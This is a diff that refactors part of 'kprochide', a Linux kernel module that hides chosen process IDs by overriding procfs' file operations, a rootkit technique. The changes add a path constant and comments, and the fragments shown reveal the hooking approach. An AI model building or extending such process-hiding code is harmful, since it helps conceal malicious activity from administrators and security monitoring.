@@ -10,7 +10,8 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("spiderpig");
 MODULE_VERSION("1.0.0");
 
-// char device
+#define PROCFS_DIR_PATH "/proc"
+
 static const char* readpid_chrdev_name = "kprochide_readpid";
 static int readpid_chrdev_major_num;
 
@@ -20,9 +21,24 @@ struct inode *procfs_inode;
 
 struct dir_context *backup_dir_context;
 
+/**
+ * empties the list of pids to hide.
+ */
 static void empty_pids_to_hide_list(void);
+
+/**
+ * restores procfs' f_ops to its default.
+ */
 static void restore_procfs_fops_to_default(void);
+
+/**
+ * overrides procfs' f_ops with our function.
+ */
 static int override_procfs_fops(void);
+
+/**
+ * determines whether a given path (representing a directory in procfs) should be hidden or not.
+ */
 static bool should_hide_pid(const char*);
 
 static int kprochide_filldir(struct dir_context *ctx, 
@@ -74,8 +90,7 @@ static bool should_hide_pid(const char* pid_dir_name)
     list_for_each_entry(pid_to_hide, &kprochide_pids_to_hide, l_head) {
         if (dir_name_as_pid == pid_to_hide->pid) {
             pid_found = true;
-            // break instead of return for us to be enable to release the mutex
-            break;
+            break; // break instead of return for us to be enable to release the mutex
         }
     }
     mutex_unlock(&kprochide_pids_to_hide_mutex);
@@ -103,7 +118,7 @@ static void empty_pids_to_hide_list()
 static int override_procfs_fops()
 {
     struct path proc_path;
-    if (kern_path("/proc", 0, &proc_path)) {
+    if (kern_path(PROCFS_DIR_PATH, 0, &proc_path)) {
         return -EIO;
     }
 
@@ -122,7 +137,7 @@ static int override_procfs_fops()
 static void restore_procfs_fops_to_default()
 {
     struct path proc_path;
-    if (kern_path("/proc", 0, &proc_path)) {
+    if (kern_path(PROCFS_DIR_PATH, 0, &proc_path)) {
         printk(KERN_ERR "kprochide: kern_path failed while trying to open procfs.\n");
         return;
     }
